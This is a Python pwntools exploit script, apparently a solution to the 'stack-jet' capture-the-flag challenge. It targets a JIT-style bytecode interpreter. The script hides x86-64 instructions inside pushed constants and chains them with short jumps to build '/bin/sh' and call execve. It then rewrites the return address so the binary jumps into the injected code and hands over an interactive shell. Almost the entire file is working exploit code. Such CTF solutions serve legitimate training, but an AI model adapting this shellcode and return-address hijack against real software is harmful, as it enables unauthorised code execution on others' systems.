#!/usr/bin/env python3

from pwn import *

exe = ELF("./stack-jet")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("stack-jet.challs.cyberchallenge.it", 9604)

    return r


def main():
    r = conn()

    # Now we can inject the code into stack with push (0x00) JIT instructions.
    # To move from a line of code to another we can use relative jumps.
    # Since we have 6 bytes left (2 are reserved for JMP instruction), we must to use short instructions!
    # NOTE: Since we need to have just one value on the stack, we DROP the pushed values.
    #       This don't affect our injected code since we will change the ret. addr. to it anyway
    code  = b'\x00' + asm('mov edi, 6845231').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'        # Moves "/sh" to EDI
    code += b'\x00' + asm('shl rdi, 32').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'             # Shifts of 4 bytes RDI
    code += b'\x00' + asm('mov esi, 1852400175').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'     # Moves "/bin" to ESI ("mov edi" gave problems)
    code += b'\x00' + asm('add rdi, rsi').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'            # Reconstruct the string with ADD
    code += b'\x00' + asm('push rdi').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'                # Pushes onto stack...
    code += b'\x00' + asm('lea rdi, [rsp]').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'          # ...so we can retrieve string's address
    code += b'\x00' + asm('xor rsi, rsi').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'            # Zeroes register RSI...
    code += b'\x00' + asm('xor rdx, rdx').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'            # ...RDX...
    code += b'\x00' + asm('xor rax, rax').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'            # ...and RAX
    code += b'\x00' + asm('add rax, 0x3b').ljust(6, b'\x90') + asm('jmp $+0x6') + b'\x01'           # Move syscode to RAX with ADD
    code += b'\x00' + asm('syscall').ljust(8, b'\x90') + b'\x01'                                    # Call EXECVE through Syscall

    code += b'\x00' + p64(0x41)     # Push a dummy return address so we can swap it with the real one.
    code += b'\x03'                 # Swap so we have the real return address as an argument in the stack.
    code += b'\x00' + p64(11)       # Push the number of bytes needed to change the ret. addr. to our injected code.
                                    # NOTE: 23 are the number of bytes before the first injected assembly instruction.
    code += b'\x04'                 # Move the ret. addr. ahead so the program will return to our injected code.
    code += b'\x03'                 # Swap again so the real ret. addr. will be in the correct position in the stack.

    r.sendlineafter(b'Number of arguments: ', b'0')
    r.sendlineafter(b'Code size: ', f'{len(code)}'.encode("ascii"))
    r.sendline(code)

    r.interactive('$ ')


if __name__ == "__main__":
    main()
